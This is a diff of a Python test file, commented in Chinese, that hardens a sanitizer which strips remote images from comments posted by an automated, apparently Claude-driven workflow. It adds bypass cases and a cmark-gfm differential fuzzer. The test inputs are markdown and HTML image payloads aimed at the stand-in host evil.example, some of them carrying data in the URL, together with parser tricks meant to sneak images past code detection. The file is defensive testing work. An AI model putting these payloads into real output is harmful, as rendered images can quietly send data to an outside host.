@@ -425,16 +425,31 @@ def test_remote_images_are_neutralized(tmp_path):
         "一般連結 [link](https://example.com) 要保留\n"
     )
     out = _posted_comment(tmp_path, body)
-    assert out.count(IMG_PLACEHOLDER) >= 5, out
+    # 同一行的圖片換成固定文字；HTML block 裡與跨行的只跳脫（換掉會刪到結構字元，見 strip_images）
+    assert out.count(IMG_PLACEHOLDER) >= 1, out
     _assert_no_image(out)
-    for bad in ("](https://evil.example/?d=AAAA)", 'src="https://evil.example/x"'):
-        assert bad not in out, out
+    assert not _rendered_fetching_tags(out), out
+    # 同一行的 inline 圖片整段換掉；HTML block 裡的 <img …> 只跳脫成文字（網址留在文字裡不會被抓）
+    assert "](https://evil.example/?d=AAAA)" not in out, out
+    assert '&lt;img src="https://evil.example/x">' in out, out
     assert "[link](https://example.com)" in out, "一般連結不會被自動抓取，必須保留"
 
 
 def test_clean_comment_unchanged(tmp_path):
     body = "## 這個 PR 做了什麼\n改了 `a < b` 的判斷，見 [文件](https://example.com/doc)。\n\n- 項目一\n"
     _same(body, _posted_comment(tmp_path, body))
+
+
+IDSP, NBSP, LSEP, PSEP, BOM = chr(0x3000), chr(0xA0), chr(0x2028), chr(0x2029), chr(0xFEFF)  # 以碼位寫，避免原始碼裡出現這些字元
+# fix round 3：Python 的 splitlines()/strip() 比 cmark 認更多換行與空白，兩邊對「什麼是程式碼」會錯開
+NONSTD_WS_CASES = [
+    *[(f"`a\n{ws}\n`![x](https://evil.example/a)`\n", f"{ws!r} 行不是空行，段落沒斷")
+      for ws in (IDSP, NBSP, "\f", "\v", "\x85", LSEP, PSEP, "\x1c")],
+    *[(f"<div>\n{ws}\n`<img src=https://evil.example/a>`\n</div>\n", f"{ws!r} 不會結束 HTML block")
+      for ws in (IDSP, NBSP)],
+    *[(f"X {sep}~~~\n![x](https://evil.example/a)\nY ~~~\n", f"{sep!r} 不是換行，~~~ 不在行首")
+      for sep in ("", "\f", "\v", "\x85", LSEP, PSEP, "\x1c", "\x1d", "\x1e")],
+]
 
 
 # --- 程式碼不能被改（fix round 2）
@@ -480,6 +495,7 @@ def test_code_is_left_byte_for_byte(tmp_path, body):
 def test_images_outside_code_never_survive(tmp_path, body):
     out = _posted_comment(tmp_path, body)
     _assert_no_image(out)
+    assert not _rendered_fetching_tags(out), out
 
 
 @pytest.mark.parametrize(
@@ -507,12 +523,23 @@ def test_images_outside_code_never_survive(tmp_path, body):
         ("$a`$ ![x](https://evil.example/a) $`b$\n", "數學 $ 可能先吃掉反引號"),
         ("| `a | ![x](https://evil.example/a) | b` |\r\n|---|---|---|\r\n", "CRLF 的表格"),
         ("<details>\n```\n-->\n![x](https://evil.example/a)\n```\n", "HTML block 裡的 fence"),
-    ],
+        # fix round 3：fuzz（對 cmark-gfm 差分）找到的
+        ("https://e/d```x<img src=https://evil.example/a>w```\n", "GFM 延伸 autolink 吃掉反引號"),
+        ("www.e.com```x<img src=https://evil.example/a>w```\n", "www. autolink"),
+        ("``````x `y ```x` y ```<img src=https://evil.example/a>```\n",
+         "cmark 的反引號快取：前面有配不到的串，後面本來配得到的也不配"),
+        ("<span>x\n<!--\n\n```x<img/src=https://evil.example/a>```\n", "HTML 模式中途出現的 <!-- 要等 -->"),
+        ("<pre>\n<!--\n-->\n\n`<img src=https://evil.example/a>`\n</pre>\n", "巢狀的結束記號都要看到"),
+        ("<img/src=x>\n<!--a\n<img x]-->```<img/src=x>\n\nword ```<video poster=https://evil.example/a>```\n",
+         "替換範圍吃到 --> 會讓後面變成 raw HTML"),
+        ("![a](u\n\n)```<img src=https://evil.example/a>```\n", "跨空行的替換會併掉段落"),
+    ]
+    + NONSTD_WS_CASES,
 )
 def test_stripper_cannot_be_tricked_into_treating_images_as_code(tmp_path, body, why):
     out = _posted_comment(tmp_path, body)
-    assert "evil.example" not in out or not _UNESCAPED_IMG.search(out), why
-    _assert_no_image(out)
+    # 以 GitHub 的 parser（cmark-gfm）渲染結果為準：真正的 code span 裡留著 `![` 是正確的
+    assert not _rendered_fetching_tags(out), f"{why}: {out!r}"
 
 
 def test_oversized_output_fails_closed(tmp_path):
@@ -563,6 +590,146 @@ def test_neutralizer_is_linear_on_pathological_input():
     out = ns["neutralize"](many)
     assert time.perf_counter() - t < 2.0
     _assert_no_image(out)
+    # fix round 3：巨大 label（![ 很深、] 很多）原本因為每個候選 label 都做正規化而要 ~31 秒
+    deep = "![ " * 44_000 + "]" * 44_000
+    t = time.perf_counter()
+    out = ns["neutralize"](deep)
+    assert time.perf_counter() - t < 2.0
+    _assert_no_image(out)
+
+
+# ------------------------------------------------------- 用 GitHub 的 parser 做差分測試（fix round 3）
+#
+# cmarkgfm 是 github/cmark-gfm 的 Python binding，只在測試用（requirements.txt），
+# workflow 執行時不需要。把 neutralize() 的「輸出」用 GitHub 風格設定渲染（GFM 擴充全開、
+# 允許 raw HTML），再用 html.parser 解析：渲染結果裡不能有任何會抓圖的元素。
+# 裝不起來時測試要失敗（import 錯誤），不能 skip。
+import cmarkgfm  # noqa: E402
+from cmarkgfm.cmark import Options as _CmarkOpts  # noqa: E402
+from html.parser import HTMLParser  # noqa: E402
+
+_FETCHING_TAGS = {"img", "image", "picture", "source", "video", "audio", "svg"}
+_RENDER_OPTS = [
+    _CmarkOpts.CMARK_OPT_UNSAFE,
+    _CmarkOpts.CMARK_OPT_UNSAFE | _CmarkOpts.CMARK_OPT_LIBERAL_HTML_TAG | _CmarkOpts.CMARK_OPT_FOOTNOTES,
+]
+
+
+class _TagCollector(HTMLParser):
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.found: list[str] = []
+
+    def handle_starttag(self, tag, attrs):
+        if tag in _FETCHING_TAGS:
+            self.found.append(tag)
+
+    handle_startendtag = handle_starttag
+
+
+def _rendered_fetching_tags(md: str) -> list[str]:
+    found: list[str] = []
+    for opts in _RENDER_OPTS:
+        p = _TagCollector()
+        p.feed(cmarkgfm.github_flavored_markdown_to_html(md, options=opts))
+        p.close()
+        found += p.found
+    return found
+
+
+def test_differential_harness_detects_images():
+    """先確認量測工具本身有效：未處理的圖片要被抓到，跳脫過的不算。"""
+    assert _rendered_fetching_tags("![x](https://e/a)")
+    assert _rendered_fetching_tags("<div>\n<img src=x>\n</div>\n")
+    assert _rendered_fetching_tags("<image src=x>")
+    assert not _rendered_fetching_tags("`<img src=x>` 與 !\\[x](y) 與 &lt;img src=x>")
+
+
+def _all_bypass_cases() -> list[str]:
+    params = []
+    for mark in test_stripper_cannot_be_tricked_into_treating_images_as_code.pytestmark:
+        if mark.name == "parametrize":
+            params += [b for b, _ in mark.args[1]]
+    for mark in test_images_outside_code_never_survive.pytestmark:
+        if mark.name == "parametrize":
+            params += list(mark.args[1])
+    params.append(
+        "看這張 ![x](https://evil.example/?d=AAAA) 圖\n<img src=\"https://evil.example/x\">\n"
+        "![ref][r]\n\n[r]: https://evil.example/ref\n"
+    )
+    return params
+
+
+def test_differential_all_bypass_cases_render_no_images():
+    ns = _neutralizer_module()
+    bad = []
+    for doc in _all_bypass_cases():
+        tags = _rendered_fetching_tags(ns["neutralize"](doc))
+        if tags:
+            bad.append((doc, tags))
+    assert not bad, "\n".join(f"{d!r} -> {t}" for d, t in bad)
+
+
+def test_differential_code_still_preserved():
+    ns = _neutralizer_module()
+    for body in (RUST_FENCE, JSX_FENCE, "用 `vec![1, 2]` 與 `vec![x][0]` 即可\n",
+                 "JSX 寫成 `<img src={logo} alt=\"x\" />`\n"):
+        assert ns["neutralize"](body) == body
+
+
+FUZZ_SEED = 20261120
+FUZZ_DOCS = 20_000
+_FUZZ_FRAGMENTS = [
+    # 圖片語法
+    "![a](https://evil.example/i)", "![a][r]", "![a][]", "![r]", "[r]: https://evil.example/d",
+    "![", "](", "]", "[", ")", "(", "![a](<https://evil.example/x>)", '![a](u "t")',
+    # HTML
+    "<img src=https://evil.example/h>", "<IMG\nsrc=x>", "<img/src=x>", "<image src=x>",
+    "<picture><source srcset=x></picture>", "<video poster=x>", "<img", ">", '"', "'",
+    "<div>", "</div>", "<!--", "-->", "<pre>", "</pre>", "<a title=\"", "<span>", "<details>",
+    # 反引號與 fence
+    "`", "``", "```", "````", "```rust", "~~~", "~~~ x", " ```", "  ```", "   ```", "    ```",
+    "\t```", " ~~~", "```x`y",
+    # 空行與各種「像空白」的字元
+    "\n", "\n", "\n", "\r\n", "\r", "\n\n", IDSP, NBSP, "\t", " ", "\f", "\v", "\x85",
+    LSEP, PSEP, "\x1c", BOM,
+    # 容器
+    "- ", "* ", "1. ", "> ", ">", "  ",
+    # 其他會影響 inline 解析的東西
+    "|---|---|", "| a | b |", "|", "$", "\\", "\\`", "\\!", "\\[", "&lt;", "&#96;",
+    # 一般文字
+    "word", "vec![1, 2]", "x", "中文", " ",
+]
+
+
+def _fuzz_docs():
+    import random
+
+    rng = random.Random(FUZZ_SEED)
+    eols = ["\n", "\r\n", "\r", "\n\n"]
+    for k in range(FUZZ_DOCS):
+        if k % 2 == 0:  # 片段直接相接
+            yield "".join(rng.choice(_FUZZ_FRAGMENTS) for _ in range(rng.randint(1, 16)))
+        else:  # 以行為單位：每行 1–6 個片段，接隨機行尾（讓 fence／HTML block／空行更常出現在行首）
+            yield "".join("".join(rng.choice(_FUZZ_FRAGMENTS) for _ in range(rng.randint(1, 6)))
+                          + rng.choice(eols) for _ in range(rng.randint(1, 8)))
+
+
+def test_differential_fuzz_no_image_ever_renders():
+    ns = _neutralizer_module()
+    neutralize = ns["neutralize"]
+    failures = []
+    for i, doc in enumerate(_fuzz_docs()):
+        out = neutralize(doc)
+        tags = _rendered_fetching_tags(out)
+        if tags:
+            failures.append((i, doc, out, tags))
+            if len(failures) >= 5:
+                break
+    assert not failures, (
+        f"seed={FUZZ_SEED} 失敗 {len(failures)} 件，第一件：#{failures[0][0]} "
+        f"doc={failures[0][1]!r} out={failures[0][2]!r} tags={failures[0][3]}"
+    )
 
 
 # ------------------------------------------------------- Claude 失敗時 fail closed
